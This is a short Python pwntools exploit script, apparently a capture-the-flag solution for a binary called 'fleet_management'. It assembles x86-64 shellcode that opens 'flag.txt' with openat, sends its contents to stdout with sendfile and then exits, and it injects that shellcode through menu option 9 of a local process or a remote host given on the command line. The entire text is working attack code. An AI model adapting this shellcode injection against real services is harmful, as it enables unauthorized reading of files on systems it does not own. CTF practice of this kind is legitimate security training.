#!/usr/bin/env pyhton3

from pwn import asm, context, log, remote, sys, u64

context.binary = 'fleet_management'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    shellcode = asm(f'''
        xor  rdx, rdx
        push rdx
        mov  rsi, {u64(b'flag.txt')}
        push rsi
        push rsp
        pop  rsi
        xor  rdi, rdi
        sub  rdi, 100
        mov  rax, 0x101
        syscall

        mov  rcx, 0x64
        mov  esi, eax
        xor  rdi, rdi
        inc  edi
        mov  al, 0x28
        syscall

        mov  al, 0x3c
        syscall
    ''')

    log.info(f'Shellcode length: {hex(len(shellcode))}')

    p.sendlineafter(b'[*] What do you want to do? ', b'9')
    p.send(shellcode)
    log.success(p.recv().decode())
    p.close()


if __name__ == '__main__':
    main()
